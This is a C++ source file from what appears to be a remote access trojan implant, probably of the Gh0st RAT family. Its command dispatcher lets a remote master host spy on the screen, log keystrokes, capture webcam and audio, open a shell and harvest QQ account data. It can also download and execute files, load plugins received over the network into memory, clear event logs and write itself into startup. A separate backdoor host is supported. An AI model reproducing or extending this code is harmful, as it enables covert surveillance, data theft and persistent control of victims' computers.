// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KernelManager.h"
#include "Loop.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

char	CKernelManager::m_strDoorMasterHost[256] = {0};
UINT	CKernelManager::m_nDoorMasterPort = 80;

HINSTANCE	CKernelManager::g_hInstances = NULL;

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszMasterHost, UINT nMasterPort, BOOL bIsBackDoor) : CManager(pClient)
{
	if (bIsBackDoor)
	{
		if (lpszMasterHost != NULL)
			lstrcpy(m_strDoorMasterHost, lpszMasterHost);
		
		m_nDoorMasterPort = nMasterPort;
	}
	else
	{
		if (lpszMasterHost != NULL)
			lstrcpy(m_strMasterHost, lpszMasterHost);
		
		m_nMasterPort = nMasterPort;
	}

	m_nThreadCount = 0;

	m_bIsBackDoor = bIsBackDoor;
}

CKernelManager::~CKernelManager()
{
	for(UINT i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	switch (lpBuffer[0])
	{
	case COMMAND_LIST_DRIVE: 
	case COMMAND_SCREEN_SPY:
	case COMMAND_KEYBOARD: 
	case COMMAND_WEBCAM:
	case COMMAND_AUDIO:
	case COMMAND_SHELL:
	case COMMAND_SYSTEMINFO:
	case COMMAND_SYSTEM: 
	case COMMAND_SERVICE:
	case COMMAND_REGEDIT:
	case COMMAND_TEXT_CHAT:
	case COMMAND_QQINFO:
	case COMMAND_PROXY_MAP:
		{
			PBYTE hMemDll   = (PBYTE)VirtualAlloc(0,nSize - 1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if (hMemDll == NULL)
				break;
			memcpy(hMemDll,lpBuffer + 1,nSize -1);
			
			
			if (m_bIsBackDoor)
			{
				m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DoorPlugin,(LPVOID)hMemDll, 0, NULL,true);
			}else
			{
				m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Plugin,(LPVOID)hMemDll, 0, NULL,true);
			}
		}
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UNINSTALL: 
		Rundll32Dll();
		break;
	case COMMAND_DOWN_EXEC: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL);
		Sleep(100);
		break;
	case COMMAND_DOWN_UPDATE:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UpdateServer,
			(LPVOID)(lpBuffer + 1), 0, NULL,true);
		break;
	case COMMAND_OPEN_URL_SHOW:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenURLSHOW,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_OPEN_URL_HIDE:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenURLHIDE,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_CLEAN_EVENT: // 日志清理
		CleanEvent(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK:
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP:
		SetGroup((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_SHOW_MSG:         // 发送信息
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_MsgBox,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_OPEN_PROXY:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Proxy,
			(LPVOID)(m_pClient), 0, NULL,true);
		break;
	case COMMAND_START:         //写入启动
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Start,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	default:
		break;
	}	
}


